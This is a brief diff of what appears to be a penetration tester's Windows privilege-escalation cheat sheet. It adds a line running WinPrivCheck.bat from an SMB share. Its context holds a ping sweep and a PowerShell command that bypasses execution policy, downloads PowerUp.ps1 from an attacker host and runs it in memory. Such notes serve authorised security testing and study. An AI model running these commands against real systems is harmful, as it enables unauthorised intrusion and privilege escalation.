@@ -31,6 +31,9 @@ for /L %i in (1,1,255) do @ping -n 1 -w 200 10.5.5.%i > nul && e cho 10.5.5.%i i
 ```bash
 //$source_ip/$smb_share/tools_windows/winPEAS.bat
 ```
+```bash
+//$source_ip/$smb_share/tools_windows/WinPrivCheck.bat
+```
 
 ```bash
 powershell.exe -noprofile -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://$source_ip/tools_windows/PowerSploit/Privesc/PowerUp.ps1'); Invoke-AllChecks"
